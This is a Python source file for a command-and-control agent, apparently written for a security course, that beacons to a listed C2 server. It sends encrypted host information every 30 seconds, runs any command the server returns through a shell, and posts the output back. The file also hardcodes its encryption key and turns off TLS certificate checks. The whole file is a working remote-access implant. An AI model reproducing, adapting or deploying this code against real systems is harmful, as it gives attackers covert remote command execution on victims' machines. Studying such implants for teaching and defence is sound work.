import requests
import subprocess
import time
import platform
import json
from cryptography.fernet import Fernet

# Encryption setup
# Must be EXACT same string that is in server.py
SECRET_KEY = b'7lJcf_dNt7Jhc87wCBcYO46b4XRy18upQmOKrij3B4k='
cipher = Fernet(SECRET_KEY)

# 1. THE FAILOVER LIST
# Put the domain names your professor gave you here.
# The agent will try these in order.
C2_DOMAINS = [
    "http://127.0.0.1:5000"
]

# 2. SYSTEM INFO (For the 'Heartbeat')
def get_system_info():
    info = {
        "hostname": platform.node(),
        "os": platform.system(),
        "status": "Online"
    }
    return json.dumps(info)

def run_agent():
    print("[*] Secure Agent started. Beginning beaconing...")
    
    while True:
        # Loop through each domain until one works
        for url in C2_DOMAINS:
            try:

                raw_data = get_system_info()
                encrypted_heartbeat = cipher.encrypt(raw_data.encode())

                # Send heartbeat + ask for commands
                # We use verify=False if you haven't set up the SSL certs yet
                response = requests.post(
                    f"{url}/checkin", 
                    data=encrypted_heartbeat, 
                    timeout=10,
                    verify=False 
                )

                if response.status_code == 200:
                    encrypted_command = response.content
                    command = cipher.decrypt(encrypted_command).decode()

                    if command and command.lower() != "none":
                        print(f"[*] Decrypted Command Recieved: {command}")
                        
                        # Execute the command and get output
                        result = subprocess.getoutput(command)
                        
                        # Send the result back to the server
                        encrypted_result = cipher.encrypt(result.encode())
                        requests.post(f"{url}/result", data=encrypted_result, verify=False)
                    
                    # If we successfully talked to a server, break the 'for' loop 
                    # and wait for the next heartbeat interval
                    break 

            except Exception as e:
                print(f"[!] Failed to connect to {url}: {e}")
                continue # Try the next domain in the list
        
        # 3. THE BEACON INTERVAL
        # Don't spam the server. Wait 30 seconds before checking in again.
        print("[*] Sleeping for 30s...")
        time.sleep(30)

if __name__ == "__main__":
    run_agent()